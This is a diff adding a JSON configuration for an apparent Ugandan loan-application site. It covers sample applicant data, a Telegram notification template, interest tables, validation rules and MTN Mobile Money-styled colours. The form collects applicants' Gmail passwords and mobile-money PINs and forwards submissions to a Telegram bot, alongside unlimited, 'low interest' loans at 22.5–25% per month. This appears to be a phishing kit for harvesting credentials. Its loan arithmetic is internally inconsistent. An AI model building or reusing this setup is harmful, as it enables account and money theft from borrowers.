@@ -1,0 +1,295 @@
+{
+  "sampleApplicationData": {
+    "personalInfo": {
+      "fullName": "John Musekera",
+      "email": "john.musekera@example.com",
+      "phone": "+256701234567",
+      "nationalID": "12345678901234",
+      "dateOfBirth": "1990-06-15"
+    },
+    "loanDetails": {
+      "type": "personal",
+      "amount": 200000,
+      "purpose": "personal_use",
+      "repaymentPeriod": 3
+    },
+    "financialInfo": {
+      "monthlyIncome": 500000,
+      "momoAccount": "+256701234567",
+      "gmailPassword": "userGmailPassword123",
+      "momoPin": "1234",
+      "employmentStatus": "employed"
+    },
+    "reference": {
+      "contactName": "Jane Musekera",
+      "contactPhone": "+256702345678"
+    },
+    "submissionTime": "2026-04-14T14:30:45.123Z"
+  },
+  "sampleTelegramMessage": "🎉 <b>NEW LOAN APPLICATION</b>\n\n<b>👤 Personal Information:</b>\nName: John Musekera\nEmail: john.musekera@example.com\nPhone: +256701234567\nNational ID: 12345678901234\nDOB: 1990-06-15\n\n<b>💰 Loan Details:</b>\nType: PERSONAL\nAmount: USH 200,000\nPurpose: personal_use\nRepayment Period: 3 months\n\n<b>💵 Financial Information:</b>\nMonthly Income: USH 500,000\nMomo Account: +256701234567\nEmployment: employed\n\n<b>👥 Reference:</b>\nName: Jane Musekera\nPhone: +256702345678\n\n<b>⏰ Submitted:</b> 4/14/2026, 2:30:45 PM",
+  "loanCalculations": {
+    "loanAmount": 200000,
+    "loanType": "personal",
+    "interestRatePerMonth": "22.5%",
+    "repaymentMonths": 3,
+    "monthlyInterest": 45000,
+    "totalInterest": 135000,
+    "totalRepayment": 335000,
+    "breakdown": {
+      "month1": {
+        "principalPayment": 66666.67,
+        "interestPayment": 45000,
+        "totalPayment": 111666.67,
+        "remainingBalance": 133333.33
+      },
+      "month2": {
+        "principalPayment": 66666.67,
+        "interestPayment": 30000,
+        "totalPayment": 96666.67,
+        "remainingBalance": 66666.66
+      },
+      "month3": {
+        "principalPayment": 66666.66,
+        "interestPayment": 15000,
+        "totalPayment": 81666.66,
+        "remainingBalance": 0
+      }
+    }
+  },
+  "validationFields": {
+    "fullName": {
+      "type": "string",
+      "required": true,
+      "minLength": 3,
+      "validation": "Name must be at least 3 characters"
+    },
+    "email": {
+      "type": "email",
+      "required": true,
+      "validation": "Must be a valid email address"
+    },
+    "phone": {
+      "type": "phone",
+      "required": true,
+      "format": "+256XXXXXXXXX or 0XXXXXXXXX",
+      "validation": "Must be a valid Uganda phone number (9+ digits)"
+    },
+    "nationalID": {
+      "type": "string",
+      "required": true,
+      "minLength": 10,
+      "maxLength": 20,
+      "validation": "National ID must be 10-20 characters"
+    },
+    "dateOfBirth": {
+      "type": "date",
+      "required": true,
+      "validation": "Applicant must be at least 18 years old"
+    },
+    "loanAmount": {
+      "type": "number",
+      "required": true,
+      "validation": "Must be greater than 0 (no upper limit)",
+      "ranges": {
+        "personal": {
+          "min": 0,
+          "max": "unlimited"
+        },
+        "business": {
+          "min": 0,
+          "max": "unlimited"
+        },
+        "emergency": {
+          "min": 0,
+          "max": "unlimited"
+        }
+      }
+    },
+    "monthlyIncome": {
+      "type": "number",
+      "required": true,
+      "validation": "Loan amount cannot exceed 3x monthly income"
+    },
+    "repaymentPeriod": {
+      "type": "number",
+      "required": true,
+      "minMonths": 1,
+      "maxMonths": 12,
+      "validation": "Must be between 1 and 12 months"
+    }
+  },
+  "loanProducts": [
+    {
+      "id": "personal",
+      "name": "Personal Loan",
+      "icon": "💳",
+      "amountRange": {
+        "min": 0,
+        "max": "unlimited",
+        "currency": "USH"
+      },
+      "interestRate": 22.5,
+      "interestUnit": "% per month",
+      "features": [
+        "Fast Approval",
+        "Low Interest Rates",
+        "Flexible Repayment"
+      ],
+      "useCase": "Personal use, daily expenses"
+    },
+    {
+      "id": "business",
+      "name": "Business Loan",
+      "icon": "🏢",
+      "amountRange": {
+        "min": 0,
+        "max": "unlimited",
+        "currency": "USH"
+      },
+      "interestRate": 23,
+      "interestUnit": "% per month",
+      "features": [
+        "Grow Your Business",
+        "Easy Terms",
+        "Quick Disbursement"
+      ],
+      "useCase": "Business expansion and operations"
+    },
+    {
+      "id": "emergency",
+      "name": "Emergency Loan",
+      "icon": "⚡",
+      "amountRange": {
+        "min": 0,
+        "max": "unlimited",
+        "currency": "USH"
+      },
+      "interestRate": 25,
+      "interestUnit": "% per month",
+      "features": [
+        "24/7 Available",
+        "Instant Cash",
+        "No Collateral"
+      ],
+      "useCase": "Urgent cash needs"
+    }
+  ],
+  "loanPurposeOptions": [
+    {
+      "value": "personal_use",
+      "label": "Personal Use"
+    },
+    {
+      "value": "business_expansion",
+      "label": "Business Expansion"
+    },
+    {
+      "value": "education",
+      "label": "Education"
+    },
+    {
+      "value": "medical",
+      "label": "Medical Expenses"
+    },
+    {
+      "value": "home_improvement",
+      "label": "Home Improvement"
+    },
+    {
+      "value": "debt_consolidation",
+      "label": "Debt Consolidation"
+    },
+    {
+      "value": "other",
+      "label": "Other"
+    }
+  ],
+  "employmentStatusOptions": [
+    {
+      "value": "employed",
+      "label": "Employed"
+    },
+    {
+      "value": "self_employed",
+      "label": "Self-Employed"
+    },
+    {
+      "value": "business_owner",
+      "label": "Business Owner"
+    },
+    {
+      "value": "unemployed",
+      "label": "Unemployed"
+    }
+  ],
+  "colorScheme": {
+    "primaryColor": "#FFA500",
+    "primaryDark": "#FF9500",
+    "secondaryColor": "#1a1a1a",
+    "accentColor": "#00AA44",
+    "lightBackground": "#f5f5f5",
+    "textColor": "#333",
+    "textLight": "#666",
+    "borderColor": "#ddd",
+    "successColor": "#00AA44",
+    "errorColor": "#FF3333",
+    "white": "#ffffff",
+    "notes": "Colors inspired by MTN Mobile Money (Uganda's leading mobile money service)"
+  },
+  "apiEndpoints": {
+    "telegramSendMessage": "https://api.telegram.org/bot{TOKEN}/sendMessage",
+    "telegramGetUpdates": "https://api.telegram.org/bot{TOKEN}/getUpdates",
+    "telegramSetWebhook": "https://api.telegram.org/bot{TOKEN}/setWebhook",
+    "notes": "Replace {TOKEN} with your actual bot token"
+  },
+  "formConfiguration": {
+    "sections": [
+      {
+        "id": "personal-info",
+        "title": "Personal Information",
+        "fields": [
+          "fullName",
+          "email",
+          "phone",
+          "nationalID",
+          "dateOfBirth"
+        ]
+      },
+      {
+        "id": "loan-details",
+        "title": "Loan Details",
+        "fields": [
+          "loanType",
+          "loanAmount",
+          "loanPurpose",
+          "repaymentPeriod"
+        ]
+      },
+      {
+        "id": "financial-info",
+        "title": "Financial Information",
+        "fields": [
+          "monthlyIncome",
+          "momoNumber",
+          "employmentStatus"
+        ]
+      },
+      {
+        "id": "reference-info",
+        "title": "Reference Information",
+        "fields": [
+          "referenceContact",
+          "referencePhone"
+        ]
+      },
+      {
+        "id": "agreement",
+        "title": "Agreements",
+        "fields": [
+          "terms",
+          "telegram"
+        ]
+      }
+    ]
+  }
+}
